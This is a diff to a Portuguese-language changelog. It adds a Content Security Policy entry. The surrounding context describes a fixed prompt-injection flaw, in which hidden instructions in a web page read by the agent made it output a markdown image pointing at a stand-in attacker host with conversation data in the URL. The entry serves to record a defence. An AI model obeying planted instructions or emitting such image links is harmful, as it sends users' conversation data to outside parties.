@@ -116,6 +116,10 @@ e o projeto adota o [Versionamento Semântico](https://semver.org/lang/pt-BR/).
   navegador busca uma imagem sozinho, sem clique: uma instrução escondida numa página lida pelo
   agente podia pedir a resposta `![](https://atacante/?d=<dados da conversa>)` e receber os dados
   na requisição. Coberto pelo spec e2e `prompt-injection.spec.ts`.
+- Política de segurança de conteúdo (CSP) nas páginas do site: imagens, scripts, estilos e
+  requisições só da própria origem, sem `object` e sem a página dentro de frames. É a segunda
+  barreira contra o vazamento por conteúdo externo na tela: mesmo que ele chegue a ser renderizado,
+  o navegador não faz a requisição para fora.
 
 ## [0.2.0] - 2026-09-30
 
